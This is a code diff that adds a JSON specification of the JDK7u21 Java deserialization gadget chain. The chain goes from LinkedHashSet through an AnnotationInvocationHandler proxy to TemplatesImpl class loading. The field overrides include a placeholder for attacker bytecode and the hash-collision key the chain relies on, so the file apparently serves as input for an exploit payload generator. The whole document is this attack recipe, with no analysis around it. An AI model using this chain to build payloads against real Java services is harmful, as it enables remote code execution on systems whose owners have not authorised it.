@@ -1,0 +1,33 @@
+{
+  "chain_type": "JDK7u21 — LinkedHashSet + AnnotationInvocationHandler proxy",
+  "root_class": "java.util.LinkedHashSet",
+  "root_trigger": "readObject→HashMap.put→equals→Proxy(AIH).equals→AnnotationInvocationHandler.equalsImpl→TemplatesImpl.getOutputProperties",
+  "links": [
+    {
+      "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+      "field_overrides": {
+        "_bytecodes": ["EVIL_BYTECODE_PLACEHOLDER"],
+        "_name": "Exploit",
+        "_tfactory": {},
+        "_outputProperties": null,
+        "_class": null
+      }
+    },
+    {
+      "class": "sun.reflect.annotation.AnnotationInvocationHandler",
+      "field_overrides": {
+        "type": "javax.xml.transform.Templates",
+        "memberValues": {
+          "f5a5a608": {"$ref": "link:0"}
+        }
+      }
+    },
+    {
+      "class": "$Proxy:javax.xml.transform.Templates",
+      "field_overrides": {
+        "h": {"$ref": "link:1"}
+      }
+    }
+  ],
+  "sink_method": "TemplatesImpl.getOutputProperties→newTransformer→defineClass"
+}
